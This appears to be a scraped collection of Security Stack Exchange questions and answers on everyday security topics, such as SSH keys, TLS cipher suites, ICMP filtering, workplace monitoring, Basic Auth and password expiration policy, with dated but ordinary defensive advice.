<p><em>Right now</em>, there is no security-related reason to prefer one type over any other, assuming large enough keys (2048 bits for RSA or DSA, 256 bits for ECDSA); key size is specified with the <code>-b</code> parameter. However, some <code>ssh-keygen</code> versions may reject DSA keys of size other than 1024 bits, which is currently unbroken, but arguably not as robust as could be wished for. So, if you indulge in some slight paranoia, you might prefer RSA.</p>

<p>To sum up, do <code>ssh-keygen -t rsa -b 2048</code> and you will be happy.</p>
","23385"
"Anonymity on Facebook - how do they suggest people I should know?","129816","","<p>I want to know how Facebook discovers the people who you know in real life or who know you. </p>

<p>I tried the following to see if Facebook can still discover my acquaintances in real life and suggest them to me as a friend.</p>

<ol>
<li>I connected using a VPN (an anonymous VPN, not one of those free VPN services). I have confirmed that it does not leak my actual IP address.</li>
<li>I cleared the cookies in my browser (specific to sites like Facebook, Google, and Yahoo) and started a fresh instance of Browsing Session. Anyway, cookies specific to Facebook only should matter, and I cleared them all.</li>
<li>I registered an email account with an email service provider who does not require a mobile number for registration. I used an email ID name which had no resemblance to my real name. I did not mention anything related to my geographical location while registering the email address. Please note that this was a fresh email address, and I have never used it to send an email or receive an email.</li>
<li>Now, I registered on Facebook, using a name which does not resemble my real name in any way.</li>
</ol>

<p>However, Facebook requires phone number verification before you complete registration on Facebook. This is the only place where I specified my real phone number to receive their security code.</p>

<p>Once, I completed the verification. The moment I logged in, I could see Facebook giving me a list of suggestions of people I may know. It was surprising indeed, since this list was extremely accurate. It included people I knew in the past as well my current acquaintances. It makes me rather suspicious.</p>

<p>The only way I see that Facebook was able to identify the people who may know me or I may know them was using my phone number. So my assumption is:</p>

<ul>
<li>They appear to have a deal with the telecommunication providers in different countries. Once you disclose your phone number, it looks like they get access to the entire list of phone numbers with whom you have corresponded in the past. Then, they do a second level lookup to identify the Facebook profiles of those corresponding phone numbers.</li>
</ul>

<p>Also, interestingly, there are some people with whom I may not have ever corresponded with on phone. But of course, Facebook can find them through other people I know and suggest them to me.</p>

<p>Am I correct that Facebook was able to do all the correlation of people I know in real life using my phone number?</p>

<p>It would be interesting to see whether they could still correlate it if I use another phone number.</p>
","<blockquote>
  <p>So, yes, they appear to have a deal with the Telecommunication
  Providers in different Countries.</p>
</blockquote>

<p>Well that's ONE explanation.</p>

<p>Another one that I like better is simply that they have all their users' contact lists, thanks to their mobile application which no doubt reads everything and sends it back to their headquarters.</p>

<p>All they have to do after you register with your real phone number is look through all those contact lists, and find the people who possess your number.</p>

<p>This idea that they may have arrangements with telecom providers seems a little far-fetched to me, in great part because it is simply illegal in many countries to disclose phone records to anyone without a court order.</p>
","61413"
"What is the difference between https://google.com and https://encrypted.google.com?","129531","","<p>Is it there any difference between the encrypted Google search (at <a href=""https://encrypted.google.com"">https://encrypted.google.com</a>) and the ordinary HTTPS Google search (at <a href=""https://google.com"">https://google.com</a>)?</p>

<p>In terms of security what were the benefits of browsing through encrypted Google search?</p>

<p><em>Note that this is not a question about <strong>HTTP</strong> vs <strong>HTTPS</strong>. These are two Google services.</em></p>
","<p><a href=""https://support.google.com/websearch/bin/answer.py?hl=en&amp;answer=173733"">According to Google</a>, the difference is with handling <a href=""https://en.wikipedia.org/wiki/HTTP_referer"">referrer information</a> when clicking on an ad.</p>

<p>After a note from AviD and with <a href=""http://chat.stackexchange.com/transcript/message/8453328#8453328"">the help of Xander</a> we conducted some tests and here are the results</p>

<p><strong>1. Clicking on an ad:</strong></p>

<ul>
<li><p><code>https://google.com</code> : Google will take you to an HTTP <a href=""https://en.wikipedia.org/wiki/URL_redirection"">redirection page</a> where they'd append your search query to the referrer information.</p></li>
<li><p><code>https://encrypted.google.com</code> : If the advertiser uses HTTP, Google will not let the advertiser know about your query. If the advertiser uses HTTPS, they will receive the referrer information normally (including your search query).</p></li>
</ul>

<p><strong>2. Clicking on a normal search result:</strong></p>

<ul>
<li><p><code>https://google.com</code> : If the website uses HTTP, Google will take you to an HTTP <a href=""https://en.wikipedia.org/wiki/URL_redirection"">redirection page</a> and will not append your search query to the referrer information. They'll only tell the website that you're coming from Google. If it uses HTTPS, it will receive referrer information normally. </p></li>
<li><p><code>https://encrypted.google.com</code> : If the website you click in the results uses HTTP, it will have no idea where you're coming from or what your search query is. If it uses HTTPS, it will receive referrer information normally.</p></li>
</ul>

<p>The same topic was covered in an <a href=""https://www.eff.org/deeplinks/2011/10/google-encrypts-more-searches"">EFF blog post</a>.</p>
","32374"
"What can a hacker do with an IP address?","128312","","<p>I have an internet connection with a static IP address. Almost all staff in my office know this IP address.  Should I take any extra care to protect myself from hackers?</p>
","<p>It depends. Think of your IP address as the same kinda thing as a real address. If a criminal knows the address of a bank, what can they do? It <em>completely depends</em> on what security is in place.</p>

<p>If you've got a firewall running (e.g. Windows Firewall) or are behind a NAT router, you're probably safe. Both of these will prevent arbitrary incoming traffic from hitting your computer. This stops most remote exploits.</p>

<p>My suggestions:</p>

<ul>
<li>Enable Windows firewall, or whatever firewall is available on your OS of choice.</li>
<li>Keep up to date with patches for your OS. These are critical!</li>
<li>Keep up to date with patches for your browser and any plugins (e.g. Flash)</li>
<li>Keep up to date with patches for your applications (e.g. Office, Adobe PDF, etc.)</li>
<li>If you're running any internet-facing services (e.g. httpd) on your machine, keep those up to date and configure their security appropriately.</li>
<li>Install a basic AV package if you're really worried. Microsoft Security Essentials (MSE) is a great choice for Windows, because it's free, unintrusive and not much of a performance hog.</li>
</ul>
","19019"
"Is it a bad idea for a firewall to block ICMP?","126709","","<p>This question was inspired by <a href=""https://security.stackexchange.com/questions/22686/is-it-good-practice-to-manually-lock-down-ports-on-each-host/22700#22700"">this answer</a> which states in part:</p>

<blockquote>
  <p>The generic firewall manifest file finishes off by dropping everything I didn't otherwise allow (besides ICMP. Don't turn off ICMP).</p>
</blockquote>

<p>But, is it truly a good practice for a firewall to allow ICMP? What are the security implications, and are there cases where ICMP should be turned off?</p>
","<p>Compared to other IP protocols ICMP is fairly small, but it does serve a large number of disparate functions. At its core ICMP was designed as the debugging, troubleshooting, and error reporting mechanism for IP. This makes it insanely valuable so a lot of thought needs to into shutting it down. It would be a bit like tacking <code>&gt;/dev/null 2&gt;&amp;1</code> to the end of all your cron entries.</p>

<p>Most of the time when I talk to people about blocking ICMP they're really talking about ping and traceroute. This translates into 3 types</p>

<ul>
<li>0 - Echo Reply (ping response)</li>
<li>8 - Echo Request (ping request)</li>
<li>11 - Time Exceeded</li>
</ul>

<p>That's 3 types out of 16. Let's look at a couple of the other ICMP type that are available.</p>

<ul>
<li>4 - Source Quench (send by a router to ask a host to slow down its transmissions)</li>
<li>3 - Destination Unreachable (consists of 16 different kinds of messages ranging from reporting a fragmentation problem up to a firewall reporting that a port is closed)</li>
</ul>

<p>Both of which can be invaluable for keeping non-malicious hosts operating properly on a network. In fact there are two (probably more but these are the most obvious to me) very good cases where you <em>don't</em> want to restrict ICMP.</p>

<ul>
<li>Path MTU Discovery - We use a combination of the Don't Fragment flag and type 3 code 4 (Destination Unreachable - Fragmentation required, and DF flag set) to determine the smallest MTU on the path between the hosts. This way we avoid fragmentation during the transmission.</li>
<li>Active Directory requires clients ping the domain controllers in order to pull down GPOs. They use ping to determine the ""closest"" controller and if none respond, then it is assumed that none are close enough. So the policy update doesn't happen.</li>
</ul>

<p>That's not to say that we should necessarily leave everything open for all the world to see. Reconnaissance <em>is</em> possible with ICMP and that is generally the reason given for blocking. One can use pings to determine if a host is actually on, or Time Exceededs (as part of a traceroute) to map out network architectures, or Rory forbid a Redirect (type 5 code 0) to change the default route of a host.</p>

<p>Given all that, my advice is, as always, take a measured and thoughtful approach to your protections. Blocking ICMP in its entirety is probably not the best idea, but picking and choosing <em>what</em> you block and to/from <em>where</em> probably will get you what you want.</p>
","22713"
"Now that it is 2015, what SSL/TLS cipher suites should be used in a high security HTTPS environment?","125813","","<p>It has become quite difficult to configure an HTTPS service that maintains ""the ideal transport layer"". How should an HTTPS service be configured to permit some reasonable level of compatibility while not being susceptible to even minor attacks?</p>

<p><a href=""https://crypto.stackexchange.com/questions/10493/why-is-tls-susceptible-to-protocol-downgrade-attacks"">TLS downgrade attacks</a>  in combination <a href=""http://en.wikipedia.org/wiki/Transport_Layer_Security#Attacks_against_TLS.2FSSL"" rel=""noreferrer"">Beast, Crime, Breach, and Poodle</a> knocks out most if not all of SSLv3 and prior. <a href=""http://redmondmag.com/articles/2014/10/29/disable-ssl-3-support.aspx"" rel=""noreferrer"">Microsoft is disabling SSLv3 by default</a>,  which sounds like a good move to me.  Due to <a href=""http://blogs.technet.com/b/srd/archive/2013/11/12/security-advisory-2868725-recommendation-to-disable-rc4.aspx"" rel=""noreferrer"">weaknesses in RC4</a>, MD5, and SHA1, there are even fewer cipher suites to choose from.</p>

<p>Would an 'ideal'  HTTPS service only enable TLS 1.0, 1.1 and 1.2 with key-size variants following ciphers?  What should be the most preferred cipher suite? </p>

<pre><code>TLS_RSA_WITH_AES_128_CBC_SHA256
TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
TLS_RSA_WITH_AES_128_GCM_SHA256
TLS_DH_RSA_WITH_AES_128_GCM_SHA256
</code></pre>
","<blockquote>
  <p>Would an 'ideal' HTTPS service only enable TLS 1.0, 1.1 and 1.2 with key-size variants following ciphers? </p>
</blockquote>

<p>No, an 'ideal' HTTPS service would enable only TLS 1.2 and enable only AEAD (Authenticated Encryption with Associated Data) based cipher suites with SHA-2, 4096 bit DH parameters and 521 bit EC curves of a type that matches your requirements (government approved or not government generated).  </p>

<p>Said service would also be unable to connect be used by a wide variety of older clients, including Android 4.3 and earlier, IE 10 and earlier, Java 7 (at least u25) and earlier), OpenSSL 0.9.8y and earlier (OpenSSL 1.0.0 is simply not listed on my source), and so on.  It would, however, be immune to any attack that works only on TLS 1.1 and below, any attack relying on SHA-1, and any attack relying on CBC mode or outdated ciphers like RC4.</p>

<p>Client cipher suite limitations per <a href=""https://www.ssllabs.com"" rel=""nofollow noreferrer"">https://www.ssllabs.com</a>.</p>

<blockquote>
  <p>What should be the most preferred cipher suite? </p>
</blockquote>

<p>It depends!</p>

<p>I assume Foward Secrecy is a requirement.</p>

<p>I assume ""believed to be reasonably secure at this time"" is a requirement.</p>

<p>I assume ""actually implemented by at least one major actor"" is a requirement.</p>

<p>All requirements regarding must have/cannot use some or another subset of ciphers (must use X, can't use Y, etc.).</p>

<p>Thus, I would propose the following lists as a reasonable start.  Begin with the top category (TLS 1.2 AEAD), then keep going down the list and adding categories until you reach a level that works with your userbase or you've reached the end of your comfort zone, whichever comes first.</p>

<p>Include as many cipher suites of each category as you can, so that when the next attack rolls around, you'll be able to remove the affected cipher suites and continue with the remainder.</p>

<p>Keep an eye on the threat environment so you can continue removing cipher suites that demonstrate vulnerabilities.</p>

<p><strong>Within each major category, please order or cull the cipher suites according to your taste: DHE is of course slower than ECDHE, but takes elliptic curve provenance out entirely, and so on.  At this time, it appears that ordering is a tradeoff, but if you want speed, prefer or even require TLS_ECDHE_*.  If you don't trust the currently commonly implemented elliptic curves, or are concerned about elliptic curves due to the <a href=""https://www.nsa.gov/ia/programs/suiteb_cryptography/"" rel=""nofollow noreferrer"">NSA Suite B guidance from Aug 2015 indicating a move away from prior Suite B elliptic curves is coming in the near future</a>, and are willing to burn CPU, prefer or even require TLS_DHE_* suites.</strong></p>

<p>Bear in mind that ""normal"" certificates are RSA certificates, which work with both TLS_ECDHE_RSA_* and TLS_DHE_RSA_* cipher suites.  DSA certificates which work with TLS_ECDHE_ECDSA_* cipher suites are very rare so far, and many CA's don't offer them.</p>

<ul>
<li>TLS 1.2 AEAD only (all are SHA-2 as well)

<ul>
<li>TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 (new 0xcca9, Pre-RFC7905 0xcc14)</li>
<li>TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (new 0xcca8, Pre-RFC7905 0xcc13)</li>
<li>TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (new 0xccaa, Pre-RFC7905 0xcc15)</li>
<li>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)</li>
<li>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 <em>should</em> category cipher suite for servers using RSA private keys and RSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-3</li>
</ul></li>
<li>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (0x9f)</li>
<li>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (0x9e)</li>
<li>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (0xc02c)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 <em>should</em> category cipher suite for servers using elliptic curve private keys and ECDSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-5</li>
</ul></li>
<li>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 <em>should</em> category cipher suite for servers using elliptic curve private keys and ECDSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-5</li>
</ul></li>
<li>These are the highest level of security I'm currently aware of in common TLS implementations.</li>
<li>As of Jan 2017, major modern browsers DO handle this level, including but not limited to Android with 6.0 supporting AES-GCM and - alone of the main ones - old valued CHACHA20-POLY1305 and 7.0 supporting new CHACHA20-POLY1305, Chrome with both AES-GCM and CHACHA20-POLY1305, Firefox with both AES-GCM and CHACHA20-POLY1305, IE and Edge with only AES-GCM, Java with only AES-GCM, OpenSSL 1.1.0 with both AES-GCM and CHACHA20-POLY1305, Safari with only AES-GCM).</li>
<li>Many major browsers cannot handle this, even 2015 vintage ones (Safari 7 on OSX 10.9, Android 4.3 and earlier, IE 10 on Win7 (IE 11 even on Win7 will support 0x9f and 0x9e if Windows has been patched)</li>
</ul></li>
<li>TLS 1.2 SHA2 family (non-AEAD)

<ul>
<li>TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (0x6b)</li>
<li>TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (0x67)</li>
<li>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (0xc028)</li>
<li>TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (0xc027)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 <em>should</em> category cipher suite for servers using RSA private keys and RSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-3</li>
</ul></li>
<li>TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384 (0xc024)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 may category cipher suite for servers using elliptic curve private keys and ECDSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-5</li>
</ul></li>
<li>TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256 (0xc023)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a TLS 1.2 <em>should</em> category cipher suite for servers using elliptic curve private keys and ECDSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-5</li>
</ul></li>
<li>TLS_ECDHE_RSA_WITH_CAMELLIA_256_CBC_SHA384 (0xc077)</li>
<li>TLS_ECDHE_RSA_WITH_CAMELLIA_128_CBC_SHA256 (0xc076)</li>
<li>TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256 (0xc4)</li>
<li>Note that you've lost AEAD mode and are using the much older CBC mode; this is less than ideal.  CBC mode has been a contributing factor for several attacks in the past, including Lucky Thirteen and BEAST, and it's not unreasonable to believe that CBC mode may be related to future vulnerabilities also.</li>
<li>Some modern browsers that don't have any AEAD cipher suites do have one more more suited in this category, for instance, IE 11 on Win7 can use TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 and Safari 6 and 7 can use a few of these

<ul>
<li>again, this is if you don't have ECDHE_ECDSA GCM suites working)</li>
</ul></li>
</ul></li>
<li>TLS 1.0 and 1.1 with modern ciphers (and outdated hashes, since that's all that's available)

<ul>
<li>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a may category cipher suite for servers using RSA private keys and RSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-2</li>
</ul></li>
<li>TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a <em>should</em> category cipher suite for servers using RSA private keys and RSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-2</li>
</ul></li>
<li>TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x39)</li>
<li>TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x33)</li>
<li>TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA (0x88)</li>
<li>TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA (0x45)</li>
<li>TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)</li>
<li>Once you're including cipher suites from this level, you're likely to find something that works with almost all modern implementations.</li>
<li>At this level, you're not only using CBC mode, you're also using SHA-1. <a href=""http://csrc.nist.gov/publications/nistpubs/800-131A/sp800-131A.pdf"" rel=""nofollow noreferrer"">NIST SP800-131A</a> recommended that SHA-1 be disallowed for digital signature generation after Dec 31, 2013 (a year ago today, actually).</li>
</ul></li>
<li>TLS 1.0 and 1.1 with older but still reasonable ciphers and outdated hashes

<ul>
<li>TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (0x16)</li>
<li>TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (0xc012)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a <em>should</em> category cipher suite for servers using RSA private keys and RSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-2</li>
</ul></li>
<li>TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc008)

<ul>
<li>For U.S. folks who are interested in NIST compliance, this is a <em>should</em> category cipher suite for servers using elliptic curve private keys and ECDSA certificates per <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> table 3-4</li>
</ul></li>
<li>IE 8 on Windows XP is still out of luck, as is Java 6u45 due to DH parameter maximums.</li>
<li>This is absolutely the minimum level I'd recommend going to.</li>
</ul></li>
<li>Note that for servers using RSA private keys and RSA certificates who need <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">NIST SP800-52 revision 1</a> compliance, you <strong>SHALL</strong>, <em>should</em>, and may implement specific other TLS_RSA_* cipher suites which DO NOT PROVIDE forward secrecy, and thus I would not recommend unless this compliance is required.

<ul>
<li>Note also that paragraph 3.3.1 of that document states specific ""The server <strong>shall</strong> be configured to only use cipher suites that are composed entirely of Approved algorithms.  A complete list of acceptable cipher suites for general use is provided in this section...""</li>
</ul></li>
<li>Other national and industry requirements will vary, of course.

<ul>
<li>and may conflict with each other; read all of those that apply to you carefully.</li>
</ul></li>
</ul>

<p>I'll put in the usual plug here - try out your cipher list with your own tools (openssl ciphers -v '...' for openssl based systems), go to <a href=""https://www.ssllabs.com/index.html"" rel=""nofollow noreferrer"">https://www.ssllabs.com/index.html</a> first to check on cipher suites supported by various clients, then set up your site, and then go back to www.ssllabs.com and run their server test.</p>

<p>Note that <em>_ECDSA_</em> cipher suites require ECDSA certificates, of course, and those are still very hard to find.</p>

<p>ETA: NSA Suite B EC advice, and IE 11/Win7 now supports 0x9f and 0x9e.</p>

<p>ETA: As of Jan 2016, NIST SP800-52r1 is unchanged, and one new cipher suite (0xc00a) has been added to the list.</p>

<p>ETA: As of Jan 2017, RFC7905 has change the three TLS 1.2 AEAD CHACHA20-POLY1305 ciphers, and ""modern"" browsers have drastically improved AEAD support as noted in new bullet.  See <a href=""https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml#tls-parameters-4"" rel=""nofollow noreferrer"">https://www.iana.org/assignments/tls-parameters/tls-parameters.xhtml#tls-parameters-4</a>   for up to date IANA cipher suites.</p>
","77018"
"Can my employer see what I do on the internet when I am connected to the company network?","122321","","<blockquote>
  <p><em>This is an attempt at a canonical question following <a href=""https://security.meta.stackexchange.com/questions/2531/would-a-canonical-can-x-see-my-data-over-wi-fi-work-internet-question-be-help/2546"">this discussion on Meta</a>. The aim is to produce basic answers that can be understood by the general audience.</em></p>
</blockquote>

<p>Let's say I browse the web and use different apps while connected to the network at work. Can my employer (who controls the network) see what websites I visit, what emails I send, my IM messages, what Spotify songs I listen to, etc? What are they able to see?</p>

<p>Does it matter if I use my own computer, or one provided for me by my employer? Does it matter what programs I use, or what websites I visit? </p>
","<h3>Yes. Always assume yes.</h3>

<p>Even if you are not sure, always assume yes. Even if you are sure, they might have a contract with the ISP, a rogue admin who installed a packetlogger, a video camera that catches your screen... yes.</p>

<p><strong>Everything you do at the workplace is visible to everyone</strong>. Especially everything you do on digital media. Especially personal things. Especially things you would not want them to see. </p>

<p>One of the basic rules of Information Security is that whoever has physical access to the machine, has the machine. <strong>Your employer has physical access to everything: the machine, the network, the infrastructure</strong>. He can add and change policies, install certificates, play man in the middle. Even websites with 'SSL' can be intercepted. There are plenty of valid reasons for this, mostly related to their own network security (antivirus, logging, prohibiting access to certain sites or functionalities). </p>

<p>Even if you get lucky and they cannot see the <em>contents</em> of your messages, they might still be able to see a lot of other things: how many connections you made, to which sites, how much data you sent, at what times... even when using your own device, even using a secure connection, network logs can be pretty revealing.</p>

<p>Please, when you are at work, or using a work computer, or even using your own computer on the company network: <strong>always assume everything you do can be seen by your employer</strong>. </p>
","142805"
"Is Teredo in my router a back door?","122008","","<p>I use the school computer, which I bought from school, administered by the IT-department. I opened a port to my computer when I stumbled upon this: </p>

<p><a href=""https://i.stack.imgur.com/GeMo8.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GeMo8.png"" alt=""UPnP settings page on 192.168.0.1, with one UDP entry for Teredo""></a></p>

<p>It points to my computer IP. (I have a static IP to my router.) The contract says the IT-department isn't allowed to enter our computers via a backdoor, but I already caught them with a hidden administrator account that they explained that was there just in case I lost my password. (But I suppose they could change it without that backdoor because the school uses domain user accounts.) It would be no problem for them to install anything on our computers without us necessarily noticing...</p>

<p>Could this be another back door, or what could it be used for? There isn't any other UPnP entries to another of the computers (wirelessly connected) here on the router.</p>
","<p>You shouldn't be worried about it. It looks as if Teredo is a IPv6 tunneling technology. According to this <a href=""http://en.wikipedia.org/wiki/Teredo_tunneling#Purpose"">Wikipedia article</a> it allows for IPv6 connectivity by tunneling IPv6 packets through your router encapsulated in IPv4/UDP datagrams (so you can still talk IPv6 even though your router doesn't).</p>
","10091"
"Is BASIC-Auth secure if done over HTTPS?","121964","","<p>I'm making a REST-API and it's straight forward to do BASIC auth login. Then let HTTPS secure the connection so the password is protected when the api is used.</p>

<p>Can this be considered secure?</p>
","<p>There are a few issues with HTTP Basic Auth:  </p>

<ul>
<li>The password is sent over the wire in base64 encoding (which can be easily converted to plaintext).</li>
<li>The password is sent repeatedly, for each request. (Larger attack window)</li>
<li>The password is cached by the webbrowser, at a minimum for the length of the window / process. (Can be silently reused by any other request to the server, e.g. CSRF).</li>
<li>The password may be stored permanently in the browser, if the user requests. (Same as previous point, in addition might be stolen by another user on a shared machine).</li>
</ul>

<p>Of those, using SSL only solves the first. And even with that, SSL only protects until the webserver - any internal routing, server logging, etc, will see the plaintext password.  </p>

<p>So, as with anything it's important to look at the whole picture.</p>

<p>Does HTTPS protect the password in transit? Yes.</p>

<p>Is that enough? Usually, no. (I want to say, always no - but it really depends on what your site is and how secure it needs to be.)</p>
","990"
"Can Android phone running without SIM card be tracked (localized) by police?","121804","","<p>I am running an Android phone without a SIM card. I am using it for web surfing.
Can the police localize my phone using the cell towers (BTS)?</p>

<p>In other words, I know Android phones emit radiations even if there is no SIM inserted. Can the service provider use these radiations to detecte where my phone is?</p>
","<p>A SIM identifies you with your network operator; it is necessary to be able to receive calls and to bill you for calls you make. Without a SIM, a phone is mostly useless as a phone, but it can still make emergency calls (in most countries). Without a SIM, your cell phone will not normally transmit data to local base stations, but if you make an emergency call, it will identify itself with the cell tower by sending its IMEI. So there is some information identifying your phone that can travel on the cell phone network, but only at your own behest. I don't know how easily the police can access this information.</p>

<p>If you've turned off GSM altogether and are only connected through wifi, it's a different matter. The wifi access point knows your phone's MAC address. Whether (or how easily) the police has access to that depends on who owns the access point.</p>

<p>Beyond that, your internet traffic does not inherently contain information that identifies your phone, but there is a lot of indirect information. Your IP address will pinpoint at least the access point's ISP and your general location, and with the cooperation of the access point owner your access can be tracked back to the access point by someone who is trying to trace your traffic. The content of your traffic may or may not identify you or your phone, for example through browser fingerprinting, or simply because you logged in to some online account.</p>

<p>If someone is in the vicinity of the access point, they can physically locate your phone by measuring its radio signal.</p>
","30885"
"How to find out the IP address of email sender in Gmail","121002","","<p>Gmail doesn't give the IP address of the sender in its mail headers for security reasons.  I'd like to know whether there is some other way of getting the IP address of the sender.</p>

<p>Since Gmail specifies the IP address of its email relay server, which the sender first contacts, is there any way of querying the relay server to get the IP address of the sender by specifying the unique Message-ID of that email? If so, please explain how is it done. And if not, is there any other method of getting the IP address?</p>
","<p>There is no technical way to get the ip-address of someone sending an email via the gmail web interface. Google does not put it into the email headers. And there is no API to query gmail for it.</p>

<p>If you really need that IP address for valid reasons, you need to go the legal way.</p>
","5471"
"Can a PDF file contain a virus?","119767","","<p>Could a PDF file contain any type of malware?</p>
","<p>There are many features in the PDF that can be used in malicious ways without exploiting a vulnerability.  One example is given by Didier Stevens <a href=""http://blog.didierstevens.com/2010/03/29/escape-from-pdf/"">here</a>.  Basically he embeds an executable and has it launch when opening the file.  I am not sure how today's versions of readers handle this but its a good method of using PDF features in malicious ways.</p>
","64081"
"How does changing your password every 90 days increase security?","118993","","<p>Where I work I'm forced to change my password every 90 days.  This security measure has been in place in many organizations for as long as I can remember.  Is there a specific security vulnerability or attack that this is designed to counter, or are we just following the procedure because ""it's the way it has always been done""?</p>

<p>It seems like changing my password would only make me more secure if someone is <em>already in my account</em>.</p>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/questions/356"">IT Security Question of the Week</a></strong>.<br/>
  Read the Jul 15, 2011 <strong><a href=""http://security.blogoverflow.com/2011/07/question-of-the-week-1/"" rel=""noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p>The reason password expiration policies exist, is to mitigate the problems that would occur if an attacker acquired the password hashes of your system and were to break them. These policies  also help minimize some of the risk associated with losing older backups to an attacker.</p>

<p>For example, if an attacker were to break in and acquire your shadow password file, they could then start brute forcing the passwords without further accessing the system.  Once they know your password, they can access the system and install whatever back doors they want unless you happen to have changed your password in the time between the attacker acquiring the shadow password file and when they are able to brute force the password hash.  If the password hash algorithm is secure enough to hold off the attacker for 90 days, password expiration ensures that the attacker won't gain anything of further value from the shadow password file, with the exception of the already obtained list of user accounts.</p>

<p>While competent admins are going to secure the actual shadow password file, organizations as a whole tend to be more lax about backups, particularly older backups.  Ideally, of course, everyone would be just as careful with the tape that has the backup from 6 months ago as they are with the production data.  In reality, though, some older tapes inevitably get misplaced, misfiled, and otherwise lost in large organizations.  Password expiration policies limit the damage that is done if an older backup is lost for the same reason that it mitigates the compromise of the password hashes from the live system.  If you lose a 6 month old backup, you are encrypting the sensitive information and all the passwords have expired since the backup was taken, you probably haven't lost anything but the list of user accounts.</p>
","4706"
"What is s3.amazonaws.com, and why is Chrome blocking it?","118442","","<p>Lately, whenever I click on a download link in Google Chrome, it redirects to another link starting with <code>s3.amazonaws.com</code>, which in turn gets blocked either by Chrome or by my Antivirus (Comodo Internet Security). Copying the same link into <s>Firefox or</s>(*) a download manager downloads the file normally.</p>

<p>I have tried resetting Chrome settings, disconnecting my Google account, removing all extensions, disabling all plugins, and performing a system scan, but the issue persists. </p>

<p>My question is: What exactly is <code>s3.amazonaws.com</code>? Is it malicious, or is Chrome mistrusting it? And how do I fix the issue?</p>

<p>Edit:</p>

<p>An example file that invokes such behavior is Pandoc <code>msi</code> setup from <a href=""https://github.com/jgm/pandoc/releases"">this page</a></p>

<p>(*) It no longer works with Firefox</p>
","<p><code>s3.amazonaws.com</code> is an endpoint for a <a href=""http://aws.amazon.com/s3/"">cloud file storage product</a> offered by Amazon Web Services (AWS) and is used by many websites and apps (albeit usually behind the scenes, but you can serve files from it directly too).</p>

